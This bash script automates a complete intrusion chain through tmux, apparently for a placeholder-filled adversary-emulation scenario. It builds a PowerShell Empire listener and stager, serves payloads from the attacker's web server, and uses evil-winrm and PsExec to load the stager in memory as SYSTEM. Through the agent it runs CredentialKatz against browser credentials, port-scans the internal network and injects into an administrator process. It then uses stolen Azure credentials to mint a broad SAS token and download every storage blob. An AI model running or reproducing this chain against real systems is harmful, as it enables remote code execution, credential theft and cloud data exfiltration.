#!/bin/bash

SESSION_NAME="Scenario-1"
LOG_BASE="/home/<local_administrator>/logs"

mkdir /home/<local_administrator>/payloads
mkdir $LOG_BASE
cp /home/<local_administrator>/CredentialKatz.exe /home/<local_administrator>/payloads/

LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server"
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/<local_administrator>/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 7
# set Host http://csrp1-cuhpf4czevfcajhw.z01.azurefd.net:80

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "uselistener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Host http://<server_domain>:80"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Port 80"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Listener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/<local_administrator>/payloads/Scenario1.exe"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario1.exe /home/<local_administrator>/payloads/Scenario1.exe


tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/<local_administrator>/payloads"
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081"
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux new-window -t $SESSION_NAME -n "Evil-Winrm"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i <workstation_ip> -u '<scenario1Username>' -p '<scenario1Password>'"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://<server_ip>:8081/Scenario1.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\<scenario1Username>\Documents\PSTools.zip"'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\<scenario1Username>\Documents\PSTools.zip" -DestinationPath "C:\Users\<scenario1Username>\Documents"'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\<scenario1Username>\Documents\run.ps1" -accepteula'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1
sleep 2
tmux send-keys -t $SESSION_NAME:1 "agents"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact "
sleep 5
tmux send-keys -t $SESSION_NAME:1 Down
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "shell"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Invoke-WebRequest -Uri http://<server_ip>:8081/CredentialKatz.exe -OutFile CredentialKatz.exe'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 '.\CredentialKatz.exe'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 '.\CredentialKatz.exe /edge'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'dir C:\Temp'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Get-Content "C:\Temp\creds.txt"'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Invoke-Command -ComputerName localhost -ScriptBlock { whoami } -Credential (New-Object System.Management.Automation.PSCredential ("<scenario1DecoyUsername>", (ConvertTo-SecureString "<scenario1DecoyPassword>" -AsPlainText -Force)))'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/Invoke-Portscan.ps1" -OutFile "C:\Users\<scenario1Username>\Documents\Invoke-Portscan.ps1"'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:1 '. "C:\Users\<scenario1Username>\Documents\Invoke-Portscan.ps1"; Invoke-Portscan -Hosts "10.0.1.4-10.0.1.12" -PingOnly'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "Hostname      : 10.0.1.12" $SESSION_NAME:1


sleep 7

tmux send-keys -t $SESSION_NAME:1 '. "C:\Users\<scenario1Username>\Documents\Invoke-Portscan.ps1"; Invoke-Portscan -Hosts "10.0.1.6" -TopPorts 100'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "Hostname      : 10.0.1.6" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "exit"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux select-window -t $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "ps"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "<administrator_user>" $SESSION_NAME:1

sleep 7

pid=$(cat logs/Scenario-1-1.log | grep "<administrator_user>" | grep "cmd" | awk '{print $2}')
echo $pid

sleep 7

tmux send-keys -t $SESSION_NAME:1 "psinject http $pid"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1


sleep 7


tmux send-keys -t $SESSION_NAME:1 "agents"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 7


tmux new-window -t $SESSION_NAME -n "Azure"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"
tmux send-keys -t $SESSION_NAME:4 'cd /home/<local_administrator>; mkdir Scenario-1; cd Scenario-1'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m

sleep 2

tmux send-keys -t $SESSION_NAME:4 'az login -u <scenario1AzureUsername>@<entraIDDomain> -p <scenario1AzurePassword>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage account list --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'EXPIRY_DATE=$(date -d "+1 day" +"%Y-%m-%d")'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'SAS_TOKEN=$(az storage account generate-sas --permissions acdlpruw --account-name <scenario1StorageName> --services b --resource-types sco --expiry $EXPIRY_DATE --https-only --output tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'echo $SAS_TOKEN'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage container list --account-name <scenario1StorageName> --sas-token "$SAS_TOKEN" --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage share list --account-name <scenario1StorageName> --sas-token "$SAS_TOKEN" --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage queue list --account-name <scenario1StorageName> --sas-token "$SAS_TOKEN" --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az storage table list --account-name <scenario1StorageName> --sas-token "$SAS_TOKEN" --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'mkdir -p downloads'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'for blob in $(az storage blob list --account-name <scenario1StorageName> --container-name <scenario1ContainerName> --sas-token "$SAS_TOKEN" --query [].name -o tsv); do az storage blob download --account-name <scenario1StorageName> --container-name <scenario1ContainerName> --name $blob --file ./downloads/$blob --sas-token "$SAS_TOKEN" --output table; done'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

echo "Reached the end."
